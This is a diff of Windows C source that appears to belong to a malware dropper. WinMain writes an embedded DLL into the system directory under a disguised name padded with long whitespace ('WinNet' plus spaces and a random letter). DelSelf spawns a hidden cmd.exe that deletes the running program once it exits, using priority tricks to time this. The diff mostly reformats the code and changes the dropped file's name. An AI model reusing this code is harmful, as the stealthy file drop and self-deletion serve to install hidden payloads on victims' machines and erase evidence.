@@ -12,7 +12,7 @@ int SEU_RandEx(int min, int max)
 		return min;
 
 	srand(GetTickCount());
-	int seed=rand()+3;
+	int seed = rand()+3;
 
 	return seed % (max - min + 1) + min;
 }
@@ -69,12 +69,11 @@ void DelSelf()
 	char szModule [MAX_PATH],
 		 szComspec[MAX_PATH],
 		 szParams [MAX_PATH];
-	// 得到文件路径:
-	if((GetModuleFileName(0,szModule,MAX_PATH)!=0) &&
-	(GetShortPathName(szModule,szModule,MAX_PATH)!=0) &&
-	(GetEnvironmentVariable("COMSPEC",szComspec,MAX_PATH)!=0))
+	
+	GetEnvironmentVariable("COMSPEC",szComspec,MAX_PATH);
+
+	if((GetModuleFileName(0,szModule,MAX_PATH) != 0) && (GetShortPathName(szModule,szModule,MAX_PATH) != 0))
 	{
-		// 设置命令参数
 		wsprintf(szParams," /c del %s > nul",szModule);
 		lstrcat(szComspec,szParams);
 		
@@ -84,24 +83,24 @@ void DelSelf()
 		si.cb = sizeof(si);
 		si.dwFlags = STARTF_USESHOWWINDOW;
 		si.wShowWindow = SW_HIDE;
-		// 为程序分配资源
-		::SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
-		::SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
+
+		SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
+		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
 		
 		// 调用命令
 		if(CreateProcess(0, szComspec, 0, 0, 0,CREATE_SUSPENDED | DETACHED_PROCESS, 0, 0, &si, &pi))
 		{
 			// 暂停命令直到程序退出
-			::SetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
-			::SetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE);
+			SetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
+			SetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE);
 			// 恢复命令并设置低优先权
-			::ResumeThread(pi.hThread);
+			ResumeThread(pi.hThread);
 			return;
 		}
 		else // 如果出错，格式化分配的空间
 		{
-			::SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
-			::SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
+			SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
+			SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
 		}
 	}
 }
@@ -112,10 +111,9 @@ int APIENTRY WinMain(HINSTANCE hInstance,
                      LPSTR     lpCmdLine,
                      int       nCmdShow)
 {
- 	// TODO: Place code here.
 	char szDllPath[MAX_PATH],szSysPath[MAX_PATH];
     GetSystemDirectory(szSysPath, MAX_PATH);
-	wsprintf(szDllPath,"%s\\R%cm%ct%cC.dll",szSysPath,SEU_RandEx('a','z'),SEU_RandEx('b','y'),SEU_RandEx('c','x'));
+	wsprintf(szDllPath,"%s\\WinNet                                               %c.dll",szSysPath,SEU_RandEx('a','z'));
 
 	ReleaseResource(NULL, IDR_DLL, "DLL", szDllPath);//释放DLL文件
 
